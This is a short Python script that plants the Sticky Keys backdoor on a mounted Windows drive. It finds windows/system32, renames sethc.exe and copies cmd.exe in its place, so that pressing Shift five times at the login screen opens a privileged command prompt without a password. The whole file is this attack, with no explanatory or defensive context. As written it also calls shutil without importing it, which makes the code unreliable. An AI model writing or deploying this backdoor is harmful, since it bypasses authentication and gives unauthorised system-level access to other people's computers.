
import sys
import os

username = os.getlogin()
directory = ""
drive_dir = "/media/" + username
def get_dir(f):
    root = drive_dir + "/" + f + "/windows/system32"
    return root
files = os.listdir(drive_dir)

for f in files:
    print(f)
    directory = get_dir(f)
    is_windows = os.path.isdir(directory)
    if is_windows == False:
        continue
    else:
        break

cmd = directory + "/cmd.exe"
sethc = directory + "/sethc.exe"
old_sethc = directory + "/sethc0.exe"

os.rename(sethc, old_sethc)
shutil.copyfile(cmd, sethc)
